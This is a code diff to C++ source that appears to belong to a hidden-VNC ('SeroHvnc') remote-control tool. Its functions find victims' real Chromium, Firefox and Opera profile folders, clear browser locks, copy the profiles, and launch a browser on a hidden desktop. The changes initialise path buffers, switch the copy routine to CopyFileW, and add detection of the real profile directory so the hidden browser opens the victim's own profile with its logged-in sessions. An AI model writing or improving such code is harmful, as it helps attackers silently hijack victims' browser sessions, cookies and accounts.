@@ -1581,8 +1581,8 @@ static wstring AltProgramFiles(const wstring& path) {
 }
 
 static wstring GetChromiumRealProfile(const wstring& exeBase) {
-    wchar_t local[MAX_PATH];
-    wchar_t roaming[MAX_PATH];
+    wchar_t local[MAX_PATH] = {0};
+    wchar_t roaming[MAX_PATH] = {0};
     SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local);
     SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, roaming);
 
@@ -1606,7 +1606,7 @@ static wstring GetChromiumRealProfile(const wstring& exeBase) {
 }
 
 static wstring GetFirefoxRealProfile() {
-    wchar_t roaming[MAX_PATH];
+    wchar_t roaming[MAX_PATH] = {0};
     SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, roaming);
     wstring ffBase = wstring(roaming) + L"\\Mozilla\\Firefox";
     wstring iniPath = ffBase + L"\\profiles.ini";
@@ -1689,7 +1689,7 @@ static void RepairChromiumJsonFile(const fs::path& path) {
 }
 
 static void CleanChromiumHvncLocks() {
-    wchar_t tempPath[MAX_PATH];
+    wchar_t tempPath[MAX_PATH] = {0};
     GetTempPathW(MAX_PATH, tempPath);
     fs::path hvncRoot = fs::path(tempPath) / L"SeroHvnc";
     if (!fs::exists(hvncRoot)) return;
@@ -1708,8 +1708,8 @@ static void CleanChromiumHvncLocks() {
 }
 
 static void CleanRealBrowserLock(const std::vector<wstring>& parts) {
-    wchar_t appData[MAX_PATH];
-    wchar_t localApp[MAX_PATH];
+    wchar_t appData[MAX_PATH] = {0};
+    wchar_t localApp[MAX_PATH] = {0};
     SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
     SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
 
@@ -1733,9 +1733,9 @@ static void CleanFirefoxRealLocks() {
 }
 
 static void RepairOperaProfileAfterHvnc() {
-    wchar_t appData[MAX_PATH];
-    wchar_t localApp[MAX_PATH];
-    wchar_t tempPath[MAX_PATH];
+    wchar_t appData[MAX_PATH] = {0};
+    wchar_t localApp[MAX_PATH] = {0};
+    wchar_t tempPath[MAX_PATH] = {0};
     SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
     SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
     GetTempPathW(MAX_PATH, tempPath);
@@ -2066,7 +2066,7 @@ static void CloneProfileWithProgress(const fs::path& src, const fs::path& dst, c
                 size_t idx = index.fetch_add(1);
                 if (idx >= pairs.size()) break;
                 try {
-                    fs::copy_file(pairs[idx].first, pairs[idx].second, fs::copy_options::overwrite_existing);
+                    CopyFileW(pairs[idx].first.wstring().c_str(), pairs[idx].second.wstring().c_str(), FALSE);
                 } catch (...) {}
                 progress.fetch_add(1);
             }
@@ -2403,7 +2403,26 @@ static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser
 
             string hvncProfileStr = string(hvncProfile.wstring().begin(), hvncProfile.wstring().end());
 
+            string profileDir = "Default";
+            if (!wRealProfile.empty()) {
+                WIN32_FIND_DATAW fd;
+                wstring searchPath = wRealProfile + L"\\*";
+                HANDLE hFind = FindFirstFileW(searchPath.c_str(), &fd);
+                if (hFind != INVALID_HANDLE_VALUE) {
+                    do {
+                        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                            (lstrcmpW(fd.cFileName, L"Default") == 0 || wcsstr(fd.cFileName, L"Profile ") == fd.cFileName)) {
+                            wstring wsName(fd.cFileName);
+                            profileDir = string(wsName.begin(), wsName.end());
+                            break;
+                        }
+                    } while (FindNextFileW(hFind, &fd));
+                    FindClose(hFind);
+                }
+            }
+
             cmd += " --user-data-dir=\"" + hvncProfileStr + "\"" +
+                   " --profile-directory=\"" + profileDir + "\"" +
                    " --start-maximized" +
                    " --no-first-run --no-default-browser-check --disable-default-apps" +
                    " --disable-background-mode --disable-background-networking" +
